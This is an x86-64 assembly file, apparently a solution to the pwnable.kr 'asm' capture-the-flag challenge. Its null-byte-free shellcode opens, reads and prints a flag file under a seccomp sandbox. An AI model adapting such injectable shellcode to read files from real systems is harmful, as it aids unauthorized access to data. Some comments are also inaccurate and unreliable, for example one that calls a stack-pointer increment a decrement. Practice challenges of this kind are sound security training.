; Shellcode for asm challenge
; Runs in seccomp sandbox and only allows open, read, and write syscalls.

global _start

section .text

_start:
    sub rsp, 32 ; room for the flag

    jmp file_name

CONTINUE:
    pop rcx
    mov rdi, rcx ; pointer to string
    xor rsi, rsi ; set rsi to 0 for O_RDONLY
    mov ecx, 0x02123456 ; Number will no null bytes
    shr ecx, 24 ; shift by 24 bits to make it equal 2
    mov rax, rcx ; set open syscall
		; arch/x86/entry/syscalls/syscall_64.tbl
    syscall ; call open
    
    mov rdi, rax ; move fd into rdi
    mov rsi, rsp ; pointer to buffer
    mov ecx, 0x20123456
    shr ecx, 24
    mov rdx, rcx ; max buffer size
    xor rax, rax ; set rax to 0
    syscall ; call read
   
    mov ecx, 0x01234567
    shr ecx, 24
    mov rdi, rcx
    mov rsi, rsp ; pointer to buffer
    mov ecx, 0x20123456
    shr ecx, 24
    mov rdx, rcx ; max buffer size
    mov ecx, 0x01234567
    shr ecx, 24
    mov rax, rcx ; set fd 1 for stdout
    syscall ; call write

    mov ecx, 0x20123456
    shr ecx, 24
    add rsp, rcx ; decrement stack pointer

    ; exit
    mov ecx, 0x3c123456
    shr ecx, 24
    mov rax, rcx
    xor rdi, rdi ; exit code 0
    syscall ; call exit

file_name:
    call CONTINUE
    db "this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong", 00h
